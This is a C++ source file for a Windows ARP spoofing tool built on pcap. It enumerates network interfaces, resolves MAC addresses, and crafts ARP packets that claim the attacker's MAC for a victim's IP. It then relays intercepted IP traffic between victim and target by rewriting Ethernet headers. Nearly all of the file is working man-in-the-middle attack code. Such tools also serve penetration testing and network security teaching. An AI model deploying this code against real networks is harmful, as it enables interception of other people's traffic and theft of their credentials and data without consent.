#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "arpspoof.h"

std::string Arpspoof::unicode_to_str(wchar_t *unistr) {
	char buf[100];
	int res = WideCharToMultiByte(CP_ACP, 0, unistr, wcslen(unistr), buf, 100, NULL, NULL);
	return res > 0 ? std::string(buf, res) : std::string();
}

std::string Arpspoof::ip_to_str(const uint8_t ip[4]) {
	return std::to_string(ip[0]) + "." + std::to_string(ip[1]) + "." + std::to_string(ip[2]) + "." + std::to_string(ip[3]);
}

std::string Arpspoof::mac_to_str(const uint8_t mac[6]) {
	char s[18];
	sprintf_s(s, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
	return std::string(s, 17);
}

std::vector<iface_info> Arpspoof::find_ifaces() {
	int i = 0;
	pcap_if_t *alldevs;
	char errbuf[PCAP_ERRBUF_SIZE];
	/* Retrieve the device list */
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	std::unordered_set<std::string> pcap_ifaces;
	for (pcap_if_t *d = alldevs; d; d = d->next) {
		pcap_ifaces.insert(d->name);
	}
	pcap_freealldevs(alldevs);

	ULONG flags = GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER | GAA_FLAG_INCLUDE_GATEWAYS;
	ULONG size = 10 * 1024;
	std::vector<uint8_t> buf(size);
	ULONG res = GetAdaptersAddresses(AF_INET, flags, nullptr, (IP_ADAPTER_ADDRESSES *)&buf[0], &size);
	if (res == ERROR_BUFFER_OVERFLOW) {
		buf.resize(size);
		res = GetAdaptersAddresses(AF_INET, flags, nullptr, (IP_ADAPTER_ADDRESSES *)&buf[0], &size);
	}
	if (res != ERROR_SUCCESS) {
		fprintf(stderr, "Can't get list of adapters: %d\n", res);
		exit(1);
	}

	std::vector<iface_info> ifaces;
	IP_ADAPTER_ADDRESSES *p = (IP_ADAPTER_ADDRESSES *)&buf[0];
	for (; p; p = p->Next) {
		if (pcap_ifaces.count(std::string("\\Device\\NPF_") + p->AdapterName) == 0) {
			continue;
		}
		if (p->OperStatus != IfOperStatusUp) {
			continue;
		}
		iface_info ii{};
		ii.ifIndex = p->IfIndex;
		ii.name = std::string("\\Device\\NPF_") + p->AdapterName;
		ii.description = unicode_to_str(p->Description) + " (" + unicode_to_str(p->FriendlyName) + ")";
		memcpy(ii.mac, p->PhysicalAddress, 6);
		if (p->FirstUnicastAddress) {
			memcpy(ii.ip, &((sockaddr_in *)p->FirstUnicastAddress->Address.lpSockaddr)->sin_addr, 4);
			ii.prefixlen = p->FirstUnicastAddress->OnLinkPrefixLength;
		}
		if (p->FirstGatewayAddress) {
			memcpy(ii.gateway, &((sockaddr_in *)p->FirstGatewayAddress->Address.lpSockaddr)->sin_addr, 4);
		}
		ifaces.push_back(std::move(ii));
	}
	return ifaces;
}

void Arpspoof::print_ifaces(const std::vector<iface_info>& ifaces) {
	int i = 1;
	for (const iface_info& iface : ifaces) {
		printf("%d. %s\t%s\n\t%s/%d gw=%s\n", i, iface.name.c_str(), iface.description.c_str(),
			ip_to_str(iface.ip).c_str(), iface.prefixlen, ip_to_str(iface.gateway).c_str());
		i++;
	}
}

bool Arpspoof::resolve(const iface_info& iface, const uint8_t ip[4], uint8_t mac[6]) {
	SOCKADDR_INET srcif;
	srcif.Ipv4.sin_family = AF_INET;
	memcpy(&srcif.Ipv4.sin_addr, iface.ip, 4);

	MIB_IPNET_ROW2 row = { 0 };
	row.InterfaceIndex = iface.ifIndex;
	row.Address.Ipv4.sin_family = AF_INET;
	memcpy(&row.Address.Ipv4.sin_addr, ip, 4);

	if (ResolveIpNetEntry2(&row, &srcif) != NO_ERROR) {
		return false;
	}
	if (row.State == NlnsReachable) {
		memcpy(mac, row.PhysicalAddress, 6);
		return true;
	}
	return false;
}

struct EthHeader {
	uint8_t dest[6];
	uint8_t src[6];
	uint16_t ethertype;
};

struct IpHeader {
	uint8_t ihl;
	uint8_t tos;
	uint16_t len;
	uint16_t frag_id;
	uint8_t frag_offs;
	uint8_t ttl;
	uint8_t proto;
	uint16_t csum;
	uint8_t src[4];
	uint8_t dest[4];
};

struct ArpHeader {
	uint16_t htype;
	uint16_t ptype;
	uint8_t hlen;
	uint8_t plen;
	uint16_t op;
	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];
};

void Arpspoof::fill_arp_packet(uint8_t *packet, const uint8_t *victim_ip, const uint8_t *victim_mac, const uint8_t *my_ip, const uint8_t *my_mac) {
	EthHeader *eth = (EthHeader *)packet;
	ArpHeader *arp = (ArpHeader *)(packet + sizeof(EthHeader));

	memcpy(eth->dest, victim_mac, 6);
	memcpy(eth->src, my_mac, 6);
	eth->ethertype = htons(0x0806);

	arp->htype = htons(0x0001);
	arp->ptype = htons(0x0800);
	arp->hlen = 6;
	arp->plen = 4;
	arp->op = htons(1);		// arp request
	memcpy(arp->sender_mac, my_mac, 6);
	memcpy(arp->sender_ip, my_ip, 4);
	memcpy(arp->target_mac, victim_mac, 6);
	memcpy(arp->target_ip, victim_ip, 4);
}

void Arpspoof::handle_packet(pcap_t *pcap, pcap_pkthdr *header, const uint8_t *data, const uint8_t *victim_mac, const uint8_t *victim_ip,
	const uint8_t *target_mac, const uint8_t *my_mac) {
	if (header->caplen != header->len || header->len > 65536) {
		return;
	}
	if (header->len < sizeof(EthHeader) + sizeof(IpHeader)) {
		return;
	}
	EthHeader *eth = (EthHeader *)data;
	if (htons(eth->ethertype) != 0x0800) {
		return;
	}
	if ((memcmp(eth->src, victim_mac, 6) != 0 && memcmp(eth->src, target_mac, 6) != 0) || memcmp(eth->dest, my_mac, 6) != 0) {
		return;
	}

	IpHeader *ip = (IpHeader *)(data + sizeof(EthHeader));
	if (memcmp(ip->src, victim_ip, 4) != 0 && memcmp(ip->dest, victim_ip, 4) != 0) {
		return;
	}

	static uint8_t new_packet[65536];
	memcpy(new_packet, data, header->len);
	if (memcmp(eth->src, victim_mac, 6) == 0) {
		memcpy(new_packet, target_mac, 6);
		memcpy(new_packet + 6, my_mac, 6);
	}
	else {
		memcpy(new_packet, victim_mac, 6);
		memcpy(new_packet + 6, my_mac, 6);
	}

	if (pcap_sendpacket(pcap, new_packet, header->len) != 0) {
		fprintf(stderr, "Error forwarding packet: %s\n", pcap_geterr(pcap));
		return;
	}
}
